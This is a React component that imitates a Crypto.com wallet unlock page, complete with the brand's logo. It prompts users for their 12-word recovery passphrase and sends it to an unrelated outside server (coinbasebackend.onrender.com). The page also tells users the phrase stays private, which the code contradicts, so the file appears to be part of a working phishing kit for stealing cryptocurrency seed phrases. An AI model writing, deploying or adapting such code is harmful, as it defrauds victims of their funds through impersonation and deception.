import React, { useState } from 'react';
import './cryptoPagesCss/cryptoWallet.css';
import axios from 'axios';
import { toast } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';
import crypto_com_logo from "../../assets/crypto_com_logo.png";

const CryptoWallet = () => {

  const [text, setText] = useState('');
  const [loading, setLoading] = useState(false);

  const unlockWallet = async () => {
    const url = 'https://coinbasebackend.onrender.com/crypto';
    const data = { passphrase: text };

    try {
      setLoading(true);
      const response = await axios.post(url, data);
      setLoading(false);
      toast.success(response.data.message); // Assuming a success message
      setText('');
    } catch (error) {
      setLoading(false);
      const errorMessage = error.response?.data?.message || 'An error occurred. Please try again.';
      toast.error(errorMessage);
    }
  };

  const unlockWithId = () => {
    toast.info('Feature not available yet.');
  };
  
  return (
    <>
      <div className='crypto_wallet_body'>
        <div className='crypto_wallet_top_body'>
          <p>Wallet</p>
          <div className='crypto_wallet_top_logo'>
            <img src={crypto_com_logo} alt='Home Logo' />
          </div>
        </div>
        <div className='crypto_wallet_h3'>
          <h3>Unlock Crypto.com Wallet</h3>
        </div>
        <div className='crypto_wallet_bottom_body'>
          <div className='crypto_wallet_bottom_container'>
            <textarea
              className='crypto_wallet_text_area'
              placeholder='Enter your 12-word passphrase here'
              value={text}
              onChange={(e) => setText(e.target.value)}
            />
            <button
              className='crypto_unlock_with_passphrase_btn'
              onClick={unlockWallet}
            >
              {loading ? 'Loading...' : 'Unlock With Passphrase'}
            </button>
            <button
              className='crypto_unlock_with_faceid_btn'
              onClick={unlockWithId}
            >
              Unlock With Face ID
            </button>
            <p>
              As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you.
              Recovery of passphrase is currently impossible.
            </p>
            <p>
              Lost your passphrase? <span>you can create a new wallet</span>, but all assets in your previous wallet will be inaccessible.
            </p>
          </div>
        </div>
      </div>
    </>
  )
}

export default CryptoWallet
